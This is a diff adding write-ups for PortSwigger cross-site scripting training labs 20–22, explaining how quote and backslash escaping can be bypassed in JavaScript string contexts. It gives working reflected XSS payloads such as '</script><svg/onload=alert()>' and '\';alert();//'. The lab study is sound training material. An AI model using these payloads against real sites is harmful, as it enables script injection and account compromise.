@@ -50,7 +50,7 @@ The user input in search bar is reflected to the user in the page without any en
 
 **Solution**
 
-```
+```js
 <svg/onload=alert(1)>
 ```
 
@@ -481,13 +481,55 @@ https://<burp_instance_url>/?%27onclick=%27alert(1)%27accesskey=%27X
 
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
 
+In this lab, the contents of the `search` parameter is reflected inside a JavaScript string. The application attempt to defend against XSS by escaping both quotes `'` and backslashes `\` to prevent from breakout out of `searchTerms`.
+
+```
+<script>
+	var searchTerms = '**PAYLOAD**';
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+However, we are still able to inject tags! This allows us to break out of the JavaScript context entirely and inject whatever subsequent content we want.
+
+**Solution**
+
+```
+</script><svg/onload=alert()>
+```
+
 ### Lab 21 - Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
 
+This lab is similar to the previous one, but this around angle brackets will be encoded. We just have to take the opposite approach and leverage the fact that we can break out of `searchTerms` by inject single quotes.
+
+```
+<script>
+	var searchTerms = '**Payload**';
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Since our input will directly be injected in a JavaScript string context, we do not even need tags to execute JS code.
+
+**Solution**
+
+```
+?search=';alert()//
+```
+
 ### Lab 22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
+
+This time around we are unable any of the following characters `< > ' "`. Once again, the developers mistake was to forget also escaping the backslash character.
+
+**Solution**
+
+```
+?search=\';alert();//
+```
 
 ### Lab 23 - Reflected XSS in a JavaScript URL with some characters blocked
 
